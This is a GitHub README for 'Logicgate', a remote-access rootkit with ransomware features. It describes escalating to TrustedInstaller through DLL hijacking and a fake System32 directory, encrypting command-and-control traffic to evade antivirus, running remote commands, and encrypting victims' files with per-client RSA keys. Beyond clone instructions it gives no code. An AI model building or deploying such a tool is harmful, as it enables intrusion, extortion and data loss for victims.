# Logicgate
_This project has a write-up with it. View it [here](https://provrb.github.io/Logicgate-Rootkit/)_

A user-mode RAT rootkit that elevates to Trusted Installer privileges by using DLL hijacking
and a System32 mock directory. Requests over sockets to and from remote hosts are encrypted using RSA
to obfuscate reverse engineering and anti-viruses monitoring network traffic. Commands can be sent from
the command-and-control server to remote hosts, these commands will be performed on the clients machine.
- Includes ransomware functionality. Encrypt files using uniquely generated 2048 RSA bit keys
for each client, and save them in a JSON file with the client machine GUID as the key index.

## Installing
How to install the source code for the project in a couple different ways.

### Using GitHub.com Website
To install the source using the GitHub website, simply visit the repository link (https://github.com/provrb/Logicgate-Rootkit)
and click the green 'Code' button at the top of the page, afterwards click 'Download ZIP'. Your download should be started.
Once downloaded as a ZIP, unpack the folder 'Logicgate-Rootkit' to a spot on your computer. You now have 
downloaded the source code for the project. 

### Using the Command Line
To install using the command line, Firstly open your terminal or command prompt
and navigate to a path somewhere on your computer where you would like to save the source code.
Afterwards, simply clone the repository using this link. https://github.com/provrb/Logicgate-Rootkit.git 
You can run the command below to do this.

```
git clone https://github.com/provrb/Logicgate-Rootkit.git
```

Finally, the source code should be saved in a folder 'Logicgate-Rootkit' to the path 
you were located in your command prompt.

## Building
Instructions for building the client DLL and server executable.
## Runnning
Instructions for running the client DLL and the server executable
## Configuration
Instructions on configuring the server, and commands such as TCP port, TCP ddns to use, etc..
## Commands
Descriptions on commands you can perform on remote hosts.
